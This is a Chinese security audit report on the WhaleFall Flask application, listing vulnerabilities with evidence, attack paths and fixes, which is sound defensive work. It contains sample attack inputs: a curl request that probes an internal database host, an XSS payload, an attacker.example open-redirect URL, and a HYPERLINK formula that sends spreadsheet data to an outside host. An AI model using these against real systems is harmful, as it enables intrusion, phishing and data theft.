# WhaleFall/鲸落 安全评审报告（以漏洞/bug 为核心）

- 日期：2025-12-23
- 评审范围（静态代码审计为主）：
  - 后端：`app/routes/**`、`app/services/**`、`app/utils/**`、`app/models/**`、`app/__init__.py`、`app/settings.py`、`wsgi.py`、`app.py`
  - 前端：`app/templates/**`、`app/static/js/**`、`app/static/vendor/**`
  - 配置/部署：`env.example`、`docker-compose*.yml`、`Dockerfile.prod`、`nginx/**`、`requirements*.txt`、`pyproject.toml`、`uv.lock`、`package*.json`
- 说明：
  - 本报告重点聚焦“可被利用”的安全缺陷与高风险配置，不讨论代码风格。
  - 证据以“文件:行号/函数/路由”形式给出，便于快速定位与修复。
  - 受当前执行环境限制，本次读取仓库文件使用本地 shell 工具完成（未启用 `filesystem-mcp`）。

---

## I. 威胁建模摘要

### A. 威胁建模（轻量）

**资产（数据/权限/系统能力）**

- 身份与会话：Flask-Login session、Remember Me cookie、JWT（`app/routes/auth.py`、`app/__init__.py`）
- 高价值机密：
  - 外部数据库连接凭据（`Credential.password` 可逆加密，`app/models/credential.py`、`app/utils/password_crypto_utils.py`）
  - 实例主机/端口、数据库版本信息（可用于内网探测与横向移动）
- 高风险能力：
  - 数据库连接测试与批量测试（对外部 DB 主机发起网络连接，`/connections/api/*`）
  - 调度器管理（任务启停/重载/执行，`/scheduler/*`）
  - 批量导入/导出（CSV 导入、CSV/JSON 导出，`/instances/batch/*`、`/files/api/*`）
  - 运维与诊断接口（健康检查、资源使用率，`/health/api/*`）

**入口（路由/任务/导入导出/外部连接）**

- 页面路由：`/auth/login`、`/dashboard/*`、`/instances/*`、`/tags/*`、`/credentials/*`、`/users/*`、`/partition/*`、`/scheduler/*`
- JSON API：`*/api/*`（实例/账户/容量/连接/缓存/日志/分区等）
- 后台任务：`app/tasks/**` + APScheduler 定时任务（账户同步、容量采集/聚合、分区维护、日志清理）
- 外部连接：数据库连接适配器（MySQL/PostgreSQL/SQLServer/Oracle）

**信任边界（浏览器↔服务端↔DB↔外部 DB/第三方）**

- 浏览器（不可信输入）→ Flask（需要认证/授权/CSRF/输入校验/输出编码）
- Flask → 内部数据库（需要最小权限 + 防注入 + 事务一致性 + 脱敏日志）
- Flask → Redis（缓存/限流，要求鉴权与网络隔离）
- Flask → 外部数据库（强授权与审计，否则天然具备“网络探测/横向移动”能力）
- 仓库/镜像构建链路 → 生产环境（供应链与密钥管理边界）

---

## II. 攻击面清单（按入口类型分组）

### B. 攻击面盘点

**页面路由**

- 认证：`/auth/login`、`/auth/change-password`
- 管理：`/instances/*`、`/accounts/*`、`/credentials/*`、`/tags/*`、`/users/*`
- 运维：`/partition/*`、`/scheduler/*`

**JSON API**

- 认证/会话：`/auth/api/login`、`/auth/api/logout`、`/auth/api/refresh`、`/auth/api/csrf-token`
- 运维/诊断：`/health/api/basic`、`/health/api/detailed`、`/health/api/health`
- 外部连接：`/connections/api/test`、`/connections/api/batch-test`、`/connections/api/status/<id>`
- 文件导入导出：`/instances/batch/api/create`、`/files/api/*`

**后台任务/调度**

- `app/scheduler.py` + `app/tasks/**`
- `/scheduler/api/jobs/*`（查看/编辑/暂停/恢复/执行/重载）

**文件/导入导出**

- CSV 导入：`/instances/batch/api/create`
- CSV/JSON 导出：`/files/api/account-export`、`/files/api/instance-export`、`/files/api/database-ledger-export`、`/files/api/log-export`

**外部连接/适配器**

- `app/services/connection_adapters/**`（对外部 DB 主机发起连接与查询）
- `app/services/*_sync/**`（批量同步会访问外部 DB）

**依赖/静态 vendor**

- Python：`requirements*.txt`（生产依赖已 pin，`requirements.txt` 还带 hash）
- 前端 vendor：`app/static/vendor/VERSIONS.txt` 标注版本，但缺少完整来源/校验链路

---

## III. 漏洞/安全 bug 清单（按严重度分组）

### C. 漏洞扫描维度覆盖（逐项，不跳过）

1) 认证：检查 cookie 属性、登出、限流与多环境差异（见 Critical-1、High-5、Low-2）  
2) 授权：检查 RBAC 粒度与可绕过点、对象级校验（见 Critical-2）  
3) 注入：检查 SQL/命令/模板/DOM XSS/SSRF/路径遍历/反序列化（见 Critical-2、High-1）  
4) CSRF/CORS/浏览器安全：检查 CSRF 覆盖、CORS+凭证、响应头（见 High-2、Medium-3、Low-2）  
5) 文件与导入导出：检查上传限制、导出 CSV 注入（见 Medium-2）  
6) 错误处理与信息泄露：检查错误回显、日志导出（见 High-2、High-3）  
7) 依赖与供应链：检查锁定、vendor 可追溯（见 Medium-5）  
8) 安全配置与部署：检查 TLS、反向代理、端口暴露、进程权限（见 Critical-1、Medium-4）  
9) 业务逻辑安全：检查“高价值能力”是否被低权限滥用（见 Critical-2）

---

### Critical

#### 1. 生产环境会话 Cookie 未启用 `Secure` + 部署链路默认 HTTP，导致会话可被窃取（账号接管）

- 标题：`SESSION_COOKIE_SECURE=False` 在生产环境固定生效，配合 HTTP 部署可导致会话劫持
- 证据：
  - `app/__init__.py:167` - `configure_security()` 中固定设置 `app.config["SESSION_COOKIE_SECURE"] = False`（`app/__init__.py:179`）
  - `nginx/sites-available/whalefall-prod:1` - `listen 80` 且未配置 TLS/重定向/安全响应头
  - `docker-compose.prod.yml` 暴露 `80:80`（同时还暴露 `5001:5001`，扩大攻击面）
- 攻击路径：
  1. 攻击者位于同一网络（或能进行流量劫持/降级），诱导用户访问 HTTP（或抓取中间链路明文）。
  2. 浏览器在 HTTP 请求中会携带未加 `Secure` 的 session cookie。
  3. 攻击者复用 cookie 直接访问受保护页面/API，获得受害者会话权限。
- 影响：
  - 会话劫持 → 账号接管 → 可执行受害者权限范围内的所有操作（包含连接测试/导出/同步/查看凭据元信息等）。
- 根因：
  - 代码层面将 `SESSION_COOKIE_SECURE` 硬编码为 False，未依据运行环境/HTTPS 状态切换。
  - 部署示例（Nginx/Docker Compose）默认未启用 TLS 与 HSTS，也未做 HTTP→HTTPS 强制跳转。
- 修复：
  - 最小修复（立即）：
    - 将 `SESSION_COOKIE_SECURE` 改为基于环境的安全默认：例如 `not app.debug` 或 `settings.force_https`（并确保生产设置 `FORCE_HTTPS=true`）。
    - 同步补齐 `REMEMBER_COOKIE_SECURE/REMEMBER_COOKIE_SAMESITE` 等相关 cookie 安全属性（避免 remember cookie 走默认）。
  - 结构性修复（中期）：
    - 在反向代理层启用 TLS（443），并强制 80→443 跳转；开启 HSTS（`Strict-Transport-Security`）。
    - 引入 `ProxyFix` 并明确可信代理层数，确保 `request.is_secure`、真实 IP、协议识别正确。
  - 长期治理（规范/测试）：
    - 加入“安全基线自检”启动检查：生产环境若未开启 `SESSION_COOKIE_SECURE` 或未启用 HTTPS，启动直接失败或报警。
- 验证：
  - 复现：
    - 访问任意页面登录后抓包，确认 `Set-Cookie` 不含 `Secure`，且可在 HTTP 下被发送。
  - 修复验证：
    - `curl -I` 检查 `Set-Cookie` 中包含 `Secure; HttpOnly; SameSite=Lax/Strict`。
    - 若启用 TLS：确保 HTTP 自动 301/308 跳转到 HTTPS，并返回 HSTS。

#### 2. 连接测试 API 仅需 `view` 权限即可对任意主机发起数据库连接（内网探测/凭据滥用/横向移动）

- 标题：`/connections/api/test` 与 `/connections/api/batch-test` 允许低权限用户发起外部 DB 连接，形成“SSRF 类能力”
- 证据：
  - 端点权限过宽：
    - `app/routes/connections.py:123` - `/api/test` 仅 `@login_required` + `@view_required`（`app/routes/connections.py:124-126`）
    - `app/routes/connections.py:315` - `/api/batch-test` 同样是 `@view_required`（`app/routes/connections.py:315-319`）
  - 支持“新连接参数”模式（任意 host/port）：
    - `app/routes/connections.py:197` - `_test_new_connection()` 直接使用 `connection_params["host"]` 构造临时实例（`app/routes/connections.py:222-229`）
  - `view` 权限在 `user` 角色默认具备：
    - `app/utils/decorators.py:381` - `user_permissions["user"]` 含 `"view"`（`app/utils/decorators.py:381-388`）
    - `app/models/user.py:38` - `role` 默认值为 `"user"`（`app/models/user.py:38-59`）
  - 凭据可被 `view` 用户枚举/选择：
    - `app/routes/credentials.py:560` - `/api/credentials` 是 `@view_required`（`app/routes/credentials.py:560-563`）
- 攻击路径：
  1. 攻击者拿到一个普通 `user` 账号（默认拥有 `view`）。
  2. 先调用凭据列表 API 枚举 `credential_id`（`GET /credentials/api/credentials`）。
  3. 调用连接测试 API，指定任意内网地址与端口（示例：扫描 10.0.0.0/8 或同网段 DB）：

     ```bash
     curl -sS -X POST 'http://<host>/connections/api/test' \
       -H 'Content-Type: application/json' \
       -H 'X-CSRFToken: <csrf>' \
       --cookie 'whalefall_session=<session>' \
       -d '{"db_type":"mysql","host":"10.0.0.12","port":3306,"credential_id":1,"name":"temp"}'
     ```

  4. 依据返回的 `success/message/database_version` 判断目标服务是否存在、凭据是否有效，从而进行内网探测与横向移动。
- 影响：
  - 内网探测：将 Web 服务变成“跳板”，绕过边界防火墙对内网 DB 的访问限制。
  - 凭据滥用：利用系统存储的高权限 DB 凭据对未知主机尝试登录，扩大泄露与破坏范围。
  - 可用性：可构造大量不可达 host/慢连接，消耗 worker 连接与时间（DoS）。
- 根因：
  - 将“高风险网络能力”错误归类为“只读 view 权限可用”。
  - 新连接测试未复用 `DataValidator` 的 host 校验/allowlist，也未限制目标网段与端口范围。
  - 缺少针对该高风险端点的专用限流与审计策略。
- 修复：
  - 最小修复（立即）：
    - 将 `/connections/api/test`、`/connections/api/batch-test`、`/connections/api/validate-params` 权限提升为 `@admin_required` 或独立权限（例如 `connections.test` / `connections.manage`），只授予管理员。
    - 禁用“新连接参数”模式：仅允许 `instance_id` 测试已登记实例（避免任意 host/port）。
  - 结构性修复（中期）：
    - 如果业务必须支持新连接测试：增加 allowlist（CIDR/域名白名单）、端口白名单、DNS 解析与私网网段策略（显式禁止 `127.0.0.0/8`、`169.254.0.0/16`、`10.0.0.0/8` 等，或反向：仅允许企业内网段）。
    - 为连接测试增加专用限流（按用户 + IP + endpoint），并加入审计日志（记录目标 host/port/db_type/credential_id）。
  - 长期治理（规范/测试）：
    - 把“外联能力”作为独立的权限域（External Connectivity Capability），要求评审与安全测试用例覆盖。
- 验证：
  - 复现：使用 `user` 账号调用 `/connections/api/test` 指定任意 host/port，确认服务端会发起连接并返回结果。
  - 修复验证：
    - `user` 账号访问应返回 403（或统一错误），管理员账号仍可使用（若允许）。
    - 若启用 allowlist：对未授权网段返回明确拒绝（不发起网络连接），并在日志中记录拒绝事件。

---

### High

#### 1. 多处 DOM XSS：前端将服务端/用户可控字符串直接写入 `innerHTML`/`.html()`（可执行任意脚本）

- 标题：未做输出编码的 DOM 插入导致 XSS（反射型/存储型链路均可能）
- 证据（部分代表性点位，均为“变量拼接进 HTML”）：
  - 直接拼接错误消息：
    - `app/static/js/modules/views/instances/statistics.js:491` - `notification.innerHTML = \`...\${message}\``
    - `app/static/js/modules/views/accounts/account-classification/permissions/permission-policy-center.js:785` - `加载权限配置失败：${error.message || "未知错误"}`
  - 连接测试结果渲染：
    - `app/static/js/modules/views/components/connection-manager.js:194-202` - `container.html(\`...${result.message || result.error}...\`)`
  - 文件名渲染：
    - `app/static/js/modules/views/instances/modals/batch-create-modal.js:102` - `...已选择文件: ${file.name}...`
  - CSRF token 可被 XSS 读取：
    - `app/templates/base.html:7` - `<meta name="csrf-token" content="{{ csrf_token() }}">`
- 攻击路径（示例链）：
  1. 攻击者诱导受害者触发某个会返回“包含攻击者可控字符串”的错误/结果（例如连接测试错误、或后端错误消息包含输入回显）。
  2. 前端将 `message/result` 直接写入 `innerHTML`/`.html()`，浏览器解析并执行其中的脚本/事件处理器。
  3. 攻击者脚本读取页面 `meta[name=csrf-token]`，并以受害者身份发起任意状态变更请求（受害者 Cookie 为 HttpOnly 也无法防止“代发请求”）。
- 影响：
  - 任意前端脚本执行：可读取页面数据、批量操作资源、触发高危接口（连接测试/导出/同步/管理类操作）。
  - 若存在可读 token（如 JWT 存储在 localStorage 或页面可见）：可进一步扩大到持久化接管。
- 根因：
  - 使用 `innerHTML`/`.html()` 渲染包含变量的字符串，未做 `escapeHtml`/`textContent` 输出编码。
  - 错误消息/结果字段未做“服务端统一可显示消息”治理，前端直接信任后端 message。
- 修复：
  - 最小修复（立即）：
    - 前端：将上述点位改为 `textContent`/DOM 节点拼装；若必须使用模板，确保所有变量都经过 `escapeHtml`。
    - 后端：对外 `message` 字段只返回“用户可见”的固定文案或枚举码，原始异常信息只入日志。
  - 结构性修复（中期）：
    - 统一封装前端渲染：禁止在业务代码中直接 `innerHTML = ...${var}`，改为组件化渲染函数（自动 escape）。
    - 补充 CSP（至少 `script-src 'self'`，逐步收紧到 nonces/hashes），降低 XSS 成功率。
  - 长期治理（规范/测试）：
    - ESLint 规则/自定义 lint：禁止 `innerHTML`/`.html()` 注入未转义变量。
    - 增加安全回归用例：对关键 toast/alert/模态渲染做 XSS payload 测试。
- 验证：
  - 复现：构造一个包含 `<img src=x onerror=alert(1)>` 的 message（或模拟后端返回），确认页面弹窗/alert 被执行。
  - 修复验证：payload 仅作为文本显示，不再执行；CSP 报告（Report-Only）中无新增违规。

#### 2. 未认证的详细健康检查泄露系统资源/组件状态，且可被频繁调用导致 DoS

- 标题：`/health/api/detailed` 与 `/health/api/health` 对外暴露内部运行状态
- 证据：
  - `app/routes/health.py:59` - `/api/detailed` 未加 `@login_required`（`app/routes/health.py:59-118`）
  - `app/routes/health.py:268` - `psutil.cpu_percent(interval=1)` 每次请求阻塞 1 秒（`app/routes/health.py:284-310`）
  - `/api/health` 未认证返回数据库/redis 连接状态与 uptime（`app/routes/health.py:120-168`）
- 攻击路径：
  1. 未登录攻击者持续请求 `/health/api/detailed`：
     - 获取 CPU/内存/磁盘使用率、数据库/缓存状态等内部信息
     - 触发阻塞式采样与依赖探测，消耗服务资源
  2. 结合错误信息与版本信息，可辅助攻击者选择 DoS/漏洞利用窗口。
- 影响：
  - 信息泄露：内部组件连通性、资源余量、运行时间、版本号等。
  - 可用性风险：高频调用导致 CPU/IO 压力上升，影响正常业务请求。
- 根因：
  - 运维诊断接口未做认证/鉴权与限流。
  - 资源采样使用阻塞式 interval。
- 修复：
  - 最小修复（立即）：
    - 将 `/health/api/detailed` 限制为管理员（`@admin_required`）或直接移除对公网暴露；仅保留 `/api/basic` 给 k8s liveness/readiness。
    - 为健康检查加限流（按 IP+endpoint），并缓存采样结果（例如 5-10 秒内复用）。
  - 结构性修复（中期）：
    - 区分“外部监控”与“内部诊断”接口：外部只返回 `200/503` + 简短状态码；内部返回详细指标但需强认证与网络隔离。
- 验证：
  - 修复前：未登录可直接访问并获取指标。
  - 修复后：未登录返回 401/403；高频请求触发 429；指标采样不再每次阻塞 1 秒。

#### 3. 连接测试失败信息直接回显异常字符串，导致信息泄露并放大 XSS 风险

- 标题：将数据库驱动异常原文回传给前端（含主机、驱动细节等）
- 证据：
  - `app/services/connection_adapters/connection_test_service.py:164` - `message = f"连接失败: {error_message}"`
  - `app/services/connection_adapters/connection_test_service.py:165` - `error` 字段回传 `error_message`
  - 前端展示层未做 escape（见 High-1，例如 `app/static/js/modules/views/components/connection-manager.js:198`）
- 攻击路径：
  1. 攻击者提交异常参数（host 字符串、端口、不可达目标），触发驱动抛出包含输入回显的异常。
  2. 服务端把异常原文写入 `message/error` 返回。
  3. 前端把 `message/error` 写入 HTML，形成反射型 XSS 或信息探测回显。
- 影响：
  - 泄露内部实现细节：驱动类型、连接策略、DNS/网络错误细节、潜在内网 host 信息。
  - 与 High-1 叠加：异常信息成为 XSS payload 载体。
- 根因：
  - 错误处理未区分“用户可见消息”与“诊断信息”。
- 修复：
  - 最小修复（立即）：对外统一返回固定文案 + `error_code`，原始异常仅记录到结构化日志（携带 `error_id` 供排查）。
  - 中期：建立错误返回 schema（`message` 仅用户文案，`details` 仅在 debug 或管理员可见）。
- 验证：
  - 修复前：响应中包含数据库驱动异常原文。
  - 修复后：响应不包含原文，仅包含 error_id/错误码；日志仍能定位根因。

---

### Medium

#### 1. 登录成功后的 `next` 参数未校验，存在开放重定向（Open Redirect）

- 标题：`/auth/login?next=` 可跳转到任意外部地址
- 证据：
  - `app/routes/auth.py:204-205` - `return redirect(next_page) if next_page else ...`
- 攻击路径：
  1. 攻击者构造链接：`/auth/login?next=https://attacker.example/phish`
  2. 受害者登录成功后被重定向到攻击站点（可用于钓鱼/引导二次攻击）。
- 影响：
  - 钓鱼与信任链攻击（用户以为仍在本站）。
  - 可与 OAuth/SSO 场景叠加产生更大风险（若未来接入）。
- 根因：未对 `next` 做同源/相对路径校验。
- 修复：
  - 最小修复（立即）：仅允许相对路径（`/xxx`），拒绝包含 scheme/netloc 的 URL；失败时回退到 dashboard。
  - 中期：使用统一 `safe_redirect(next, fallback=url_for(...))` 工具函数并全局复用。
- 验证：
  - 修复前：`next=https://evil.com` 会跳出站点。
  - 修复后：外部 next 被忽略/拒绝并回退到站内。

#### 2. CSV 导出未防 Spreadsheet Formula Injection（CSV 注入）

- 标题：导出 CSV 时未对 `= + - @` 开头单元格做防护
- 证据（代表性）：
  - `app/routes/files.py:172-208` - `_render_accounts_csv()` 直接写入 `username_display/tags_display/classification_str`
  - `app/routes/files.py:275-305` - `_serialize_logs_to_csv()` 直接写入 `log.message/traceback/context_str`
- 攻击路径：
  1. 攻击者通过标签/名称/描述等可写字段写入 `=HYPERLINK(...)` 之类内容。
  2. 管理员导出 CSV 并用 Excel/WPS 打开，公式被执行（可能触发外联、数据泄露，甚至 DDE 等旧风险）。
- 影响：
  - 终端侧数据泄露（外联 URL 携带本地内容/用户信息）。
  - 在特定环境下可升级为命令执行链路（依赖客户端配置与软件版本）。
- 根因：导出时缺少 CSV 注入清洗。
- 修复：
  - 最小修复（立即）：对所有字符串单元格做前缀处理：若以 `= + - @` 开头，统一前置 `'` 或 `\t`。
  - 中期：提供“导出安全策略”配置（允许/禁止导出堆栈、上下文等敏感字段）。
- 验证：
  - 复现：写入 `=HYPERLINK("http://example.com?x="&A1)` 后导出，打开 Excel 观察是否执行。
  - 修复后：单元格以文本形式展示（含前置 `'`），不再作为公式解析。

#### 3. 反向代理未正确透传真实客户端 IP，登录限流可能退化为“全站共享 IP”导致 DoS

- 标题：`login_rate_limit` 使用 `request.remote_addr`，在 Nginx 反代下可能恒为 `127.0.0.1`
- 证据：
  - `app/utils/rate_limiter.py:283` - `identifier = request.remote_addr or "unknown"`
  - `nginx/sites-available/whalefall-prod:23-27` - Nginx 设置 `X-Real-IP/X-Forwarded-For`，但 Flask 未见 `ProxyFix`/信任代理配置
- 攻击路径：
  1. 攻击者对登录接口发起少量失败请求，触发基于 `127.0.0.1` 的共享限流。
  2. 由于所有用户的 `remote_addr` 都被视作代理地址，导致其他真实用户也被限流（登录 DoS）。
- 影响：
  - 可用性：低成本锁死登录入口。
  - 审计质量：日志与风控无法区分真实来源。
- 根因：未在 Flask 层启用 `ProxyFix` 或等价机制来解析 `X-Forwarded-For`。
- 修复：
  - 最小修复（立即）：引入 `ProxyFix` 并配置可信代理层数；同时确保 Nginx 覆盖并清理传入的 `X-Forwarded-*`。
  - 中期：限流标识改为 `user_id + ip` 组合，并在登录前使用 `request.access_route` 解析链路。
- 验证：
  - 修复前：生产环境日志中 `remote_addr` 大量为 `127.0.0.1`；限流对所有用户生效。
  - 修复后：可区分真实客户端 IP，限流只影响攻击源。

#### 4. 生产部署暴露 PostgreSQL/Redis 到宿主机端口（暴露面过大）

- 标题：`docker-compose.prod.yml` 将数据库与缓存端口直接映射到宿主机
- 证据：
  - `docker-compose.prod.yml:22-27` - `postgres` 暴露 `"5432:5432"`
  - `docker-compose.prod.yml:52-58` - `redis` 暴露 `"6379:6379"`
- 攻击路径：
  1. 攻击者扫描宿主机开放端口，直接对 PostgreSQL/Redis 发起爆破或利用。
  2. 一旦弱口令/配置错误/0day，可能绕过应用层直接读取与篡改数据。
- 影响：
  - 数据泄露、数据破坏、持久化后门（Redis/PG 均属高价值基础设施）。
- 根因：生产 compose 未按“最小暴露面”设计，缺少网络隔离/仅内部访问。
- 修复：
  - 最小修复（立即）：移除 `ports` 映射，仅保留内部 `networks`；如确需暴露，至少 bind 到 `127.0.0.1:5432` 并配合防火墙。
  - 中期：数据库/缓存放入私有子网或托管服务，严格安全组与最小权限账号。
- 验证：
  - `docker ps`/`ss -lntp` 确认宿主机不再监听 5432/6379（或仅监听 localhost）。

#### 5. 供应链治理缺口：前端 vendor 仅记录版本，缺少来源与完整性校验链路

- 标题：静态 vendor 缺少可验证的来源与校验（SRI/签名/下载脚本）
- 证据：
  - `app/static/vendor/VERSIONS.txt` 记录版本，但未提供 hash/来源 commit/tag 的可追溯链路
- 攻击路径：
  1. 攻击者在构建机/镜像分发/仓库协作链路中替换 vendor 文件（例如注入恶意 JS）。
  2. 由于缺少 hash/SRI/来源追溯，变更可能在评审或上线阶段被忽略。
  3. 恶意 JS 在用户浏览器中执行（可窃取 CSRF token、代发请求、窃取页面数据）。
- 影响：
  - 供应链投毒：前端静态资源被替换后形成“全站 XSS”级别后果。
  - 审计困难：无法快速确定被篡改版本与影响范围，增加应急成本。
- 根因：
  - vendor 管理未形成“来源-版本-完整性校验”的闭环，仅有人为版本说明。
- 修复建议：
  - 最小：在 `VERSIONS.txt` 中补充每个文件的 SHA256（或 SRI），并在 CI 校验。
  - 中期：通过 npm/lockfile + 构建产物生成 vendor（或使用 CDN + SRI）。
- 验证：
  - CI 中对 vendor 文件做 hash 校验，变更必须更新记录并评审。

---

### Low

#### 1. 登出接口允许 GET 请求，存在 Logout CSRF（低影响但可被滥用）

- 标题：`/auth/api/logout` 同时支持 GET/POST
- 证据：
  - `app/routes/auth.py:260-264` - `methods=["GET", "POST"]` 且 `GET` 不会触发 CSRF 校验（CSRFProtect 默认跳过 GET）
- 攻击路径：
  - 攻击者诱导用户点击跨站链接到 `/auth/api/logout`，在 `SameSite=Lax` 下顶层导航可能携带 cookie，导致用户被动登出。
- 影响：
  - 可用性/体验：强制登出，打断操作；可作为社工/干扰手段。
- 根因：
  - 将“状态变更操作”暴露为 GET 方法，绕过了 CSRF 保护的覆盖范围（CSRFProtect 默认仅保护非 SAFE 方法）。
- 修复：
  - 最小：仅允许 POST，并保留 CSRF 校验；前端用 `fetch` 或表单 POST 触发登出。
- 验证：
  - 修复后 `GET /auth/api/logout` 返回 405，`POST` 正常。

---

### D. 修复路线图（最多 8 条行动项，优先高收益/低风险）

1. 修复生产会话安全：启用 `SESSION_COOKIE_SECURE` + 强制 HTTPS/HSTS，并补齐 Cookie 安全属性（Critical-1）
2. 收敛外部连接能力：下线“任意 host/port”连接测试或提升到管理员权限 + allowlist + 限流审计（Critical-2）
3. 修复 DOM XSS：禁止 `innerHTML/.html()` 注入未转义变量，统一 escape 与 CSP（High-1）
4. 收紧健康检查：`/health/api/detailed` 仅内部可用（鉴权+限流+缓存指标）（High-2）
5. 修复开放重定向：统一 safe redirect（Medium-1）
6. 修复 CSV 注入：导出时做公式前缀防护（Medium-2）
7. 修复反代真实 IP：引入 `ProxyFix` 并校准限流标识（Medium-3）
8. 加固部署：移除 DB/Redis 端口映射、Gunicorn 非 root 运行、减少对外暴露端口（Medium-4）

---

## IV. 防御/兼容/回退/适配逻辑中的安全风险点（重点关注 or/||/兜底）

> 这些点位未必直接构成漏洞，但容易在“兼容旧 schema/兜底逻辑”中引入权限绕过、错误信息泄露或 XSS 载体放大。

1) 位置：`app/static/js/core/http-u.js:214-222`  
   - 类型：兼容/回退  
   - 描述：`body.message || body.error` 混用两种错误字段，可能掩盖后端错误 schema 漂移，且把更“详细”的 error 直接展示给用户。  
   - 建议：统一后端错误 schema（例如固定 `message`），前端只读一个字段；若需要兼容，改为显式分支并记录命中率，逐步清理旧字段。

2) 位置：`app/static/js/modules/views/components/connection-manager.js:194-202`  
   - 类型：兼容/回退（同时属于安全缺陷放大器）  
   - 描述：`${result.message || result.error}` 直接注入 `.html()`，当后端回显异常文本时，会成为 XSS payload 载体。  
   - 建议：把 message 渲染改为 `textContent` 或 escape；并收敛后端对外 message。

3) 位置：`app/static/js/modules/views/instances/detail.js:1207-1212`  
   - 类型：兼容/回退  
   - 描述：`data?.error || data?.message` 用于 toast 与 HTML 输出，容易把不该展示的内部错误带到 UI。  
   - 建议：改为显式字段优先级（只展示 `message`），并将 `error` 仅用于日志/调试。

4) 位置：`app/routes/accounts/sync.py:112-120`  
   - 类型：兼容/回退  
   - 描述：`is_success = bool(normalized.pop("success", True))`，当下游返回未包含 `success` 的异常结果时，可能被误判为成功（业务一致性风险）。  
   - 建议：默认值应为 False；或要求所有下游结果必须显式带 `success` 字段，并在缺失时记录告警。

---

## V. 安全规范缺口清单（建议写成文档/ADR）

1) 认证与会话基线
- 生产环境 Cookie 基线（Secure/HttpOnly/SameSite、remember cookie、session 生命周期）
- 反向代理与真实 IP/协议治理（`ProxyFix`、可信代理层数、头部清洗策略）
- 登录/高危操作限流策略（按用户/IP/设备维度）

2) 授权模型与高危能力隔离
- “外联能力”单独权限域（连接测试/同步/探测类能力必须强授权）
- 对象级授权规范（如凭据/实例/导出等是否需要更细粒度权限）
- 权限 schema 与前后端一致性约束（避免 view 权限扩大到危险能力）

3) 输入校验与输出编码标准
- 服务端 DTO/校验层：统一使用 DataValidator/表单服务进行 host/port/name 等校验（禁止绕过）
- 前端输出编码：禁止 `innerHTML/.html()` 注入未转义变量；必须使用 `textContent` 或 `escapeHtml`
- XSS 防线：CSP 落地路线（Report-Only → 强制），配合模板/JS 改造

4) 错误返回与日志脱敏规范
- 错误响应 schema 固化（`message`/`message_code`/`error_id`），禁止把原始异常文本回传
- 日志字段脱敏规范（token/密码/连接串/PII），并对日志导出功能做分级授权

5) CORS/CSRF 策略
- 允许的 Origin 白名单策略与变更流程（禁止 `*` + credentials）
- JSON API CSRF 方案（header 方案、token 获取接口的访问策略）

6) 文件处理安全规范
- CSV 导出防注入规范（统一 escape 规则）
- 上传限制（大小/类型/行数/解析超时）与安全回归测试

7) 依赖与供应链治理
- Python：CI 强制使用 lock（`uv.lock`/hash）与漏洞扫描（`pip-audit`/`safety`）
- 前端 vendor：来源、版本、hash/SRI、更新与审计流程

8) 部署与运行时加固
- 生产 compose/Nginx 基线：不暴露 DB/Redis、仅暴露必要端口、TLS/HSTS、安全响应头、请求体大小/超时
- 进程权限：Gunicorn/应用进程非 root 运行，最小权限文件系统与密钥挂载策略
